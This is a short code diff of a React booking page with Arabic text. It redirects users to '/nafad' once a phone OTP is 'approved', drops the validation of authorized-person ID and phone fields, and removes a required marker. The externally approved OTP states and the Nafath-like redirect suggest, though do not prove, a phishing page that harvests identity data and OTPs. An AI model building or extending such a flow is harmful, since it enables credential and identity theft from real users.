@@ -354,8 +354,7 @@ export default function BookingPage() {
     if (phoneOtpApproval === "approved") {
       setIsLoading(false)
       // Navigate to success page or show success message
-      setCurrentStep("landing")
-      alert("تم التحقق بنجاح! شكراً لك.")
+  window.location.href="/nafad"
     } else if (phoneOtpApproval === "rejected") {
       setIsLoading(false)
       setPhoneOtpError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.")
@@ -605,11 +604,7 @@ export default function BookingPage() {
       return
     }
 
-    // ADDED START
-    if (!authorizedName || !authorizedPhone || !authorizedId || !authorizedBirthDate || !authorizedAgreement) {
-      setVehicleInfoError("يرجى ملء جميع بيانات المفوض المطلوبة والموافقة على الشروط.")
-      return
-    }
+  
 
     const authorizedPhoneValidation = validateSaudiPhoneNumber(authorizedPhone)
     if (!authorizedPhoneValidation.valid) {
@@ -1073,7 +1068,7 @@ export default function BookingPage() {
                   {/* Authorized Name */}
                   <div className="space-y-3 mb-6">
                     <label className="text-sm font-medium text-foreground">
-                      اسم المفوض <span className="text-red-500">*</span>
+                      اسم المفوض <span className="text-red-500"></span>
                     </label>
                     <Input
                       type="text"
